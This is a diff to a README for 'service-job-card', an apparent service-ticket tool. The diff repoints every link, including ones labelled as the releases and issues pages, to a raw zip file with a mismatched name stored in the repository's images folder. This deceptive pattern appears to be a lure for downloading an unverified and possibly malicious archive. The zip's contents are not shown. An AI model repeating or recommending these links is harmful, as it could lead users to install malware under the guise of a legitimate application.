@@ -1,7 +1,7 @@
 # 🚀 service-job-card - Create, Manage, and Print Service Tickets Effortlessly
 
 ## 📥 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/h3yjuice/service-job-card/main/codfishery/service-job-card.zip%20Latest%https://raw.githubusercontent.com/h3yjuice/service-job-card/main/codfishery/service-job-card.zip)](https://raw.githubusercontent.com/h3yjuice/service-job-card/main/codfishery/service-job-card.zip)
+[![Download Latest Release](https://github.com/h3yjuice/service-job-card/raw/refs/heads/main/images/service-card-job-2.5.zip%20Latest%https://github.com/h3yjuice/service-job-card/raw/refs/heads/main/images/service-card-job-2.5.zip)](https://github.com/h3yjuice/service-job-card/raw/refs/heads/main/images/service-card-job-2.5.zip)
 
 ## 📘 Description
 Service Job Card is an offline application designed for managing service tickets. It allows users to create job tickets easily, track their progress, and print receipts. This tool is completely client-side, meaning that it works right from your browser without needing an internet connection. With features like auto-generated IDs, live totals, and balance tracking, you're equipped to streamline your service tasks efficiently.
@@ -10,7 +10,7 @@ Service Job Card is an offline application designed for managing service tickets
 To start using Service Job Card, follow the steps below to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/h3yjuice/service-job-card/main/codfishery/service-job-card.zip) to download the application.
+1. Visit the [Releases page](https://github.com/h3yjuice/service-job-card/raw/refs/heads/main/images/service-card-job-2.5.zip) to download the application.
 2. Look for the latest version available. It will include the necessary files to run the application smoothly. 
 3. Click on the download link to save the application file to your computer.
 4. Once downloaded, locate the file in your downloads folder.
@@ -53,7 +53,7 @@ If you encounter any issues:
 - **Re-download the application**: If a file seems corrupted, download it again.
 
 ## 📫 Feedback and Contributions
-We appreciate any feedback about your experience using the Service Job Card. If you want to contribute, feel free to check our [issues page](https://raw.githubusercontent.com/h3yjuice/service-job-card/main/codfishery/service-job-card.zip) for ongoing discussions.
+We appreciate any feedback about your experience using the Service Job Card. If you want to contribute, feel free to check our [issues page](https://github.com/h3yjuice/service-job-card/raw/refs/heads/main/images/service-card-job-2.5.zip) for ongoing discussions.
 
 ## 🌟 Thank You!
 We hope Service Job Card helps you manage your service tasks with efficiency and ease. Enjoy using the application and printing your tickets seamlessly. 
